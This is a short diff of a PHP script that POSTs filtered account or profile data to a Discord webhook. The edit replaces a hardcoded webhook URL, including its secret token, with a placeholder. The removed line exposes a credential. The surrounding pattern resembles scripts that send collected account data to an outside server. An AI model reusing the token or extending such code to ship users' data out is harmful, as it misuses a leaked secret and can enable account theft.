@@ -94,7 +94,7 @@ if (account_filter($profile)) {
 
     $ch = curl_init();
     curl_setopt_array($ch, [
-        CURLOPT_URL => "https://discord.com/api/webhooks/854200541385850900/rOvWa2idDLaUNCrlGR4zaUhlZ2ltr6YJl80f9x2ipFY3W9LuuXzzry0sFPw5nMq7OGnp",
+        CURLOPT_URL => "YOUR WEBHOOK HERE",
         CURLOPT_POST => true,
         CURLOPT_POSTFIELDS => $object,
         CURLOPT_HTTPHEADER => [
